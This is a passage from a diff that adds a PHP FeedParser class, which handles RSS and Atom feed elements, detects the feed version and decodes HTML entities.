+            if (in_array($this->getParentTag(), $this->hasSubTags)) {
+                if (! is_array($this->items[$this->itemIndex][$this->getParentTag()])) {
+                    $this->items[$this->itemIndex][$this->getParentTag()] = [];
+                }
+
+                $this->items[$this->itemIndex][$this->getParentTag()][$this->currentTag] .= strip_tags($this->unhtmlentities((trim($data))));
+
+                return;
+            }
+
+            if (! in_array($this->currentTag, $this->hasSubTags)) {
+                $this->items[$this->itemIndex][$this->currentTag] .= strip_tags($this->unhtmlentities((trim($data))));
+            }
+
+            if (! empty($this->currentAttr)) {
+                $this->items[$this->itemIndex][$this->currentTag . '_ATTRS'] = $this->currentAttr;
+
+                //If the tag has no value
+
+                if (strlen($this->items[$this->itemIndex][$this->currentTag]) < 2) {
+                    //If there is only one attribute, assign the attribute value as feed element's value
+                    if (count($this->currentAttr) == 1) {
+                        foreach ($this->currentAttr as $attrVal) {
+                            $this->items[$this->itemIndex][$this->currentTag] = $attrVal;
+                        }
+                    }
+                    //If there are multiple attributes, assign the attribute array as feed element's value
+                    else {
+                        $this->items[$this->itemIndex][$this->currentTag] = $this->currentAttr;
+                    }
+                }
+            }
+        }
+    }
+
+    /**
+     * Find out the feed version
+     *
+     * @param string  name of current tag
+     * @param array   array of attributes
+     * @param mixed $tagName
+     * @param mixed $attrs
+     *
+     * @return void
+     */
+    private function findVersion($tagName, $attrs)
+    {
+        // Ambil versi RSS kalau ada
+        if ($tagName == 'RSS') {
+            foreach ($attrs as $attr => $value) {
+                if ($attr == 'VERSION') {
+                    $this->version = 'RSS ' . $value;
+
+                    return;
+                }
+            }
+        }
+
+        $namespace = array_values($attrs);
+
+        foreach ($this->namespaces as $value => $version) {
+            if (in_array($value, $namespace)) {
+                $this->version = $version;
+
+                return;
+            }
+        }
+    }
+
+    private function getParentTag()
+    {
+        return $this->insideItem[count($this->insideItem) - 2];
+    }
+
+    /**
+     * Detect if current position is in channel element
+     *
+     * @return bool
+     */
+    private function inChannel()
+    {
+        if ($this->version == 'RSS 1.0') {
+            if (in_array('CHANNEL', $this->insideItem) && $this->currentTag != 'CHANNEL') {
+                return true;
+            }
+        } elseif ($this->version == 'RSS 2.0') {
+            if (in_array('CHANNEL', $this->insideItem) && ! in_array('ITEM', $this->insideItem) && $this->currentTag != 'CHANNEL') {
+                return true;
+            }
+        } elseif ($this->version == 'ATOM 1') {
+            if (in_array('FEED', $this->insideItem) && ! in_array('ENTRY', $this->insideItem) && $this->currentTag != 'FEED') {
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    /**
+     * Detect if current position is in Item element
+     *
+     * @return bool
+     */
+    private function inItem()
+    {
+        if ($this->version == 'RSS 1.0' || $this->version == 'RSS 2.0') {
+            if (in_array('ITEM', $this->insideItem) && $this->currentTag != 'ITEM') {
+                return true;
+            }
+        } elseif ($this->version == 'ATOM 1') {
+            if (in_array('ENTRY', $this->insideItem) && $this->currentTag != 'ENTRY') {
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    //This function is taken from lastRSS
+    /**
+     * Replace HTML entities &something; by real characters
+     *
+     * @see http://lastrss.oslab.net/
+     *
+     * @param string
+     * @param mixed $string
+     *
+     * @return string
+     */
+    private function unhtmlentities($string)
+    {
+        // Get HTML entities table
+        $trans_tbl = get_html_translation_table(HTML_ENTITIES, ENT_QUOTES);
+        // Flip keys<==>values
+        $trans_tbl = array_flip($trans_tbl);
+        // Add support for &apos; entity (missing in HTML_ENTITIES)
+        $trans_tbl += ['&apos;' => "'"];
+
+        // Replace entities by values
+        return strtr($string, $trans_tbl);
+    }
+} //End class FeedParser
